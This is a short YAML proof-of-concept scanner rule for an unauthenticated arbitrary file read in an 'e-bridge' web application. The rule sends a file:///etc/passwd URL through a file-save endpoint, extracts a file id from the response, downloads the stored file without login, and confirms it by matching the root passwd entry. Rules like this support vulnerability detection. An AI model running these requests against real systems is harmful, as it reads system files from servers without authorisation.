name: poc-yaml-e-bridge-anyfile-read
rules:
  - method: GET
    path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
    follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(b"id")
    search: |
      \"id\"\:\"(?P<var>.+?)\"\,
  - method: GET
    path: /file/fileNoLogin/{{var}}
    follow_redirects: false
    expression: |
      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
detail:
  author: MrP01ntSun(https://github.com/MrPointSun)
  links:
    - https://blog.csdn.net/DFMASTER/article/details/108551478
